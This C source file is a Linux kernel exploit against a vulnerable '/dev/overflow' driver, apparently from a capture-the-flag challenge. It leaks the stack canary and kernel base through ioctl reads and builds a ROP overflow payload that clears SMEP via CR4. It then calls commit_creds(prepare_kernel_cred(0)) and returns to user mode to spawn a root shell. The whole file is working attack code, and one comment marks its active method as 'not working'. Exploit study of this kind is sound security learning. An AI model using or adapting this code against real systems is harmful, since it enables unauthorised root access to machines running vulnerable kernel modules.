#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>

#define DEV_NAME "/dev/overflow"

int fd;
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

unsigned long long user_cs, user_ss, user_rsp, user_flag;
void save_status(){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_rsp,rsp;"
        "pushf;"  // push flag
        "pop user_flag;" // pop flag
    );
    puts("[*] save the state success!");
}

void getshell(){
    system("/bin/sh");
}

void restore_status(){
    __asm__(
        "swapgs;"
        "push user_ss;"
        "push user_rsp;"
        "push user_flag;"
        "push user_cs;"
        "lea rax, getshell;"
        "push rax;"
        "iretq;"
    );
}

void getroot(void){
    commit_creds(prepare_kernel_cred(0));
    __asm__(
        "lea rax, restore_status;"
        "jmp rax;"
    );
}

void read_eight_bytes(int offset, char *buf){
    for (int i=0; i <= 7; i++){
        ioctl(fd, 0x114514, offset + i);
        read(fd, &buf[i], 1);
    }
}

int main(){
    fd = open(DEV_NAME, O_RDWR); // open device

    if (fd < 0){
        puts("open device failed!");
        exit(0);
    }
    else
        printf("open device as fd=%d\n", fd);

    for(int i=0; i<0x20; i++){
        size_t val;
        read_eight_bytes(i*8, &val);
        printf("%llx -------------------> 0x%llx\n", i*8, val);
    }


    size_t val, module_base, canary, vmlinux_base;
    size_t mov_cr4_rax, pop_rax;

    char payload[0x100] = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
    read_eight_bytes(0x28, &canary);
    read_eight_bytes(0x30, &val);
    read_eight_bytes(0xd0, &vmlinux_base);
    vmlinux_base -= 0x181BA8;
    module_base = val - 0x1b0;
    commit_creds = vmlinux_base + 0xffffffff92c70bb0 - 0xffffffff92c00000;
    prepare_kernel_cred = vmlinux_base + 0xffffffff92c70f50 - 0xffffffff92c00000;
    mov_cr4_rax = vmlinux_base + 0xffffffff81002b42 - 0xffffffff81000000;
    pop_rax = vmlinux_base + 0xffffffff81347fb5 - 0xffffffff81000000;


    printf("canary----------------> 0x%llx\n", canary);
    printf("module_base-----------> 0x%llx\n", module_base);
    printf("vmlinux_base----------> 0x%llx\n", vmlinux_base);
    

    // method 1 (when smep is not enabled)
    // printf("restore_status--------> 0x%llx\n", getroot+4);
    // *(size_t *)(&payload[0x30]) = canary;
    // *(size_t *)(&payload[0x38+0x8*1]) = getroot+0x4;

    // method 2 (not working)
    printf("pop_rdi---------------> 0x%llx\n", pop_rax);
    printf("mov_cr4_rdi-----------> 0x%llx\n", mov_cr4_rax);

    *(size_t *)(&payload[0x30]) = canary;
    *(size_t *)(&payload[0x38+0x8*1]) = pop_rax;
    *(size_t *)(&payload[0x38+0x8*2]) = 0x6f0;
    *(size_t *)(&payload[0x38+0x8*3]) = mov_cr4_rax;
    *(size_t *)(&payload[0x38+0x8*4]) = getroot+0x4;

    write(fd, payload, 0x100);
    getchar();
    save_status();
    ioctl(fd, 0x1919810, 0x60);
    close(fd); // free device
}
